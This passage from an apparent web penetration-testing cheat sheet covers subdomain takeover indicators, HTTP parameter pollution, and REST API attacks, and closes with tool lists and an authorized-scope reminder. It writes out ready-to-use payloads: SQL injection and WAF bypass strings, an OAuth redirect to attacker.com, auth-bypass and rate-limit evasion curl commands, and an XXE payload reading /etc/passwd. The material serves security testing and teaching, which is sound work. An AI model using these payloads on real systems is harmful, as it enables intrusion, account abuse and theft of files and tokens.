| Service        | Error Indicator                          | Takeover Method              |
| -------------- | ---------------------------------------- | ---------------------------- |
| GitHub Pages   | 404 - There isn't a GitHub Page here     | Create repo with CNAME file  |
| Heroku         | No such app                              | Create app with matching name|
| AWS S3         | NoSuchBucket                             | Create bucket with same name |
| Shopify        | Shop currently unavailable               | Register shop                |
| Azure          | 404 Web Site not found                   | Create web app               |
| Fastly         | Fastly error: unknown domain             | Register domain in Fastly    |
| Ghost          | Site is not found                        | Create Ghost site            |
| Surge.sh       | project not found                        | Deploy to surge              |
| WordPress      | Do you want to register                  | Register WordPress site      |
| Tumblr         | There's nothing here                     | Register Tumblr blog         |
| Zendesk        | Help Center Closed                       | Register Zendesk account     |

---

## HTTP Parameter Pollution

::code-preview
---
class: "[&>div]:*:my-0"
---
HPP exploitation techniques.

#code
```
# Server behavior with duplicate parameters
# Technology        Result for ?a=1&a=2
# PHP/Apache        Last: a=2
# ASP.NET/IIS       All: a=1,2
# JSP/Tomcat        First: a=1
# Python/Django     Last: a=2
# Ruby/Rails        Last: a=2
# Node.js/Express   All: a=[1,2]

# WAF bypass via HPP
# WAF checks first param, backend uses last
?id=1&id=1 UNION SELECT 1,2,3

# Parameter separation
?search=admin&search=' OR 1=1--

# Override security parameters
?action=view&action=delete&confirm=yes

# CSRF token bypass
?token=valid&action=transfer&token=&action=delete

# API parameter pollution
POST /api/transfer
amount=100&to=victim&amount=10000

# OAuth HPP
?redirect_uri=https://legit.com&redirect_uri=https://attacker.com
```
::

---

## API Security Attacks

::code-preview
---
class: "[&>div]:*:my-0"
---
REST API attack techniques.

#code
```bash
# API enumeration
# Common API paths
/api
/api/v1
/api/v2
/api/v3
/api/docs
/api/swagger
/swagger.json
/swagger-ui.html
/openapi.json
/api-docs
/graphql
/graphiql

# Method enumeration
curl -X GET https://target.com/api/users
curl -X POST https://target.com/api/users
curl -X PUT https://target.com/api/users/1
curl -X PATCH https://target.com/api/users/1
curl -X DELETE https://target.com/api/users/1
curl -X OPTIONS https://target.com/api/users
curl -X HEAD https://target.com/api/users

# Authentication bypass
# Try without auth header
curl https://target.com/api/admin

# Try different auth methods
curl -H "Authorization: Bearer null" https://target.com/api/admin
curl -H "Authorization: Bearer undefined" https://target.com/api/admin
curl -H "Authorization: Bearer" https://target.com/api/admin

# Mass assignment
# If API accepts JSON, try adding admin fields
POST /api/register
{"username":"test","password":"test","role":"admin","isAdmin":true}

# Rate limiting bypass
# Rotate IP via X-Forwarded-For
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/login
curl -H "X-Forwarded-For: 127.0.0.2" https://target.com/api/login

# API versioning bypass
/api/v1/users → 403
/api/v2/users → 200
/api/v3/users → 200

# Content-Type manipulation
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/plain

# JSON to XML conversion for XXE
{"username":"admin"} →
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><username>&xxe;</username></root>
```
::

### OWASP API Top 10

| Rank | Vulnerability                        | Description                              |
| ---- | ------------------------------------ | ---------------------------------------- |
| 1    | Broken Object Level Authorization    | IDOR in API endpoints                    |
| 2    | Broken Authentication                | Weak auth mechanisms                     |
| 3    | Broken Object Property Level Auth    | Mass assignment, excessive data exposure |
| 4    | Unrestricted Resource Consumption    | No rate limiting, DoS                    |
| 5    | Broken Function Level Authorization  | Admin function access                    |
| 6    | Unrestricted Access to Sensitive Flows | Business logic abuse                  |
| 7    | Server-Side Request Forgery          | SSRF via API                             |
| 8    | Security Misconfiguration            | Default configs, verbose errors          |
| 9    | Improper Inventory Management        | Undocumented/old API versions            |
| 10   | Unsafe Consumption of APIs           | Trust third-party APIs blindly           |

---

## Useful Tools Reference

| Tool              | Purpose                                   |
| ----------------- | ----------------------------------------- |
| Burp Suite        | Web proxy, scanner, repeater              |
| OWASP ZAP         | Open-source web proxy and scanner         |
| SQLMap             | Automated SQL injection                   |
| Nikto             | Web server scanner                        |
| Nuclei            | Template-based vulnerability scanner      |
| ffuf              | Web fuzzer                                |
| Gobuster          | Directory/DNS brute forcing               |
| wfuzz             | Web fuzzer                                |
| Commix            | Command injection exploitation            |
| XSSStrike         | XSS scanner                               |
| Dalfox            | XSS scanner and parameter analysis        |
| jwt_tool          | JWT testing                               |
| GraphQLmap        | GraphQL exploitation                      |
| Arjun             | Hidden HTTP parameter discovery           |
| ParamSpider       | Parameter discovery from archives         |
| Sublist3r         | Subdomain enumeration                     |
| httprobe          | HTTP/HTTPS probing                        |
| waybackurls       | Fetch URLs from Wayback Machine           |
| gau               | Get All URLs                              |
| hakrawler         | Web crawler                               |

---

## References

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks Web Pentesting](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [Payload Box](https://github.com/payloadbox)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Bug Bounty Hunting Essentials](https://www.bugcrowd.com/)

::tip
Always test web attacks within the **authorized scope** of your engagement. Many of these techniques can cause **data loss or service disruption** if used irresponsibly. Document every finding and provide **remediation guidance** to the client.
::
:::